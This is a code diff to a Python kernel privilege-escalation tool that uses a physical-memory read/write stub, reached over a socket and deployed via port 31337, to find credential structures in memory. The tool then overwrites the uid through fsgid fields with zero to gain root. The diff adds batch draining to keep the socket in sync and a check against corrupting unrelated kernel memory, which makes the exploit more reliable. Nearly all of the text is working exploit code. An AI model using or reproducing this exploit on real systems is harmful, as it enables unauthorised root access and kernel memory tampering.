@@ -12,7 +12,9 @@ So:
   3. walk *backwards* along prev until our "PHYSRPC1" thread is found,
   4. patch uid..fsgid to 0 through the cred pointer stored right before comm.
 
-Usage: python recon/kroot.py [--exec]
+Usage: python tools/kernel_root.py --fork      # the working path (fork landmark)
+       python tools/kernel_root.py             # legacy task-list walk
+       (--exec sends op 5 instead of leaving the socket; deploy via 31337 instead)
 """
 import struct
 import sys
@@ -43,7 +45,7 @@ PAGE = 0x1000
 
 
 def iter_owner_creds(rpc, start, stop, batch_pages=4096, pattern=OWNER_PAT,
-                     progress=None):
+                     progress=None, limit=None):
     """Yield the cred address implied by every owner-id pattern in [start, stop).
 
     Page-straddle safe.  `data.find(PAT)` on one 4 KiB page cannot see a 32-byte
@@ -51,6 +53,12 @@ def iter_owner_creds(rpc, start, stop, batch_pages=4096, pattern=OWNER_PAT,
     invisible per page); keeping the last len(pattern)-1 bytes of each page as a
     carry finds it without a second full scan.  A page that fails to read breaks
     the carry: the next page is not physically adjacent to the last good one.
+
+    `limit` stops after that many hits, but only after DRAINING the current
+    readmany batch: the stub has already sent those pages, and abandoning them
+    desynchronises the socket (the next op would read page bytes as its status
+    word).  tv_rootwatch's early break used to do exactly that (review
+    2026-10-31).
     """
     overlap = len(pattern) - 1
     page = start
@@ -59,7 +67,8 @@ def iter_owner_creds(rpc, start, stop, batch_pages=4096, pattern=OWNER_PAT,
     hits = 0
     while page < stop:
         count = min(batch_pages, max(1, (stop - page + PAGE - 1) // PAGE))
-        for p, data in rpc.readmany(page, count):
+        batch = rpc.readmany(page, count)
+        for p, data in batch:
             scanned += 1
             if data is None:
                 carry = b""
@@ -70,6 +79,10 @@ def iter_owner_creds(rpc, start, stop, batch_pages=4096, pattern=OWNER_PAT,
                 # carry belongs to the page before p
                 yield (p - len(carry) + off - 4) & 0xFFFFFFFF
                 hits += 1
+                if limit is not None and hits >= limit:
+                    for _ in batch:      # drain the in-flight batch
+                        pass
+                    return
                 off = blob.find(pattern, off + 1)
             carry = data[-overlap:] if overlap else b""
         page += count * PAGE
@@ -207,6 +220,13 @@ def patch_full(rpc, cred_phys):
     2026-10-26).
     """
     if cred_phys >= 0xC0000000:
+        # The documented gate: a task pointer is only a cred if it LOOKS like
+        # one.  root() and physmap's tag path read the pointer straight out of a
+        # task page; without this a stale word whose target +4 happens to read
+        # 5001 zeroed 8 words of arbitrary kernel memory (review 2026-10-31).
+        if not _sane_cred(rpc, cred_phys):
+            print(f"[-] reject {T.hexs(cred_phys)}: not cred-shaped", flush=True)
+            return False
         cred_phys = PHYS(cred_phys)
     try:
         uid = rpc.read_u32(cred_phys + 4)
